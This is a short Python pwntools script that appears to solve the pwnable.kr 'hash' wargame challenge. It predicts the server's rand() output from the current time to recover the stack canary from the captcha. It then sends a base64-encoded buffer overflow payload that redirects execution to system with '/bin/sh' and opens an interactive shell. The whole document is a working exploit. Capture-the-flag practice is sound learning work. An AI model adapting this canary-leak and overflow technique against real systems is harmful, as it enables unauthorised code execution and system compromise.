import ctypes
from pwn import *

libc = ctypes.CDLL('libc.so.6')
# libc = ctypes.cdll.LoadLibrary('libc.so.6')
io = remote('pwnable.kr', 9002)
libc.srand(libc.time(0))
io.recvuntil(b'Are you human? input captcha : ')
captcha = int(io.recvline()[:-1])
log.success('captcha => %d', captcha)
io.sendline(str(captcha).encode())
rands = [libc.rand() for _ in range(8)]
canary = (captcha-rands[4]+rands[6]-rands[7]-rands[2]+rands[3]-rands[1]-rands[5]) & 0xffffffff
log.success('canary => %#x', canary)
call_system = 0x8049187
g_buf = 0x804B0E0  # .bss
process_hash = 0x8048f92
payload = cyclic(0x200) + p32(canary) + cyclic(0xc) + p32(call_system)
payload += p32(g_buf + len(b64e(payload))+4)
payload = b64e(payload).encode()
payload += b'/bin/sh\x00'
io.recvuntil(b'Encode your data with BASE64 then paste me!\n')
io.sendline(payload)
io.interactive()